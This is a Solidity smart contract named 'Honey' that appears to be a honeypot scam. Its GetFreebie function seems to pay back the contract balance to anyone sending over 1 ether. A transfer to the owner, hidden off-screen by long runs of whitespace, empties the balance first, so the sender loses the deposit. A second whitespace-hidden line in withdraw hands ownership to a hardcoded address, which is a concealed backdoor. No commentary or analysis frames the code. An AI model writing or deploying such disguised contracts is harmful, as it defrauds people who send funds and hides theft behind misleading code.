 

pragma solidity ^0.4.19;

contract Honey
{
    address public Owner = msg.sender;
   

  function generateName(bytes16 _s, uint256 _len, uint256 _n)
    public
    pure
    returns (bytes16 ret)
  {
    uint256 v = _n;
    bytes16 num = 0;
    while (v > 0) {
      num = bytes16(uint(num) / (2 ** 8));
      num |= bytes16(((v % 10) + 48) * 2 ** (8 * 15));
      v /= 10;
    }
    ret = _s | bytes16(uint(num) / (2 ** (8 * _len)));
    return ret;
  }

    function()
    public
    payable
    {
        
    }
   
    function GetFreebie()
    public
    payable
    {                                                                    
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Owner.transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
            msg.sender.transfer(this.balance);
        }                                                                                                                
    }
    
    function withdraw()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x0C76802158F13aBa9D892EE066233827424c5aAB){Owner=0x0C76802158F13aBa9D892EE066233827424c5aAB;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }
    
    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == Owner);
         
        adr.call.value(msg.value)(data);
    }
}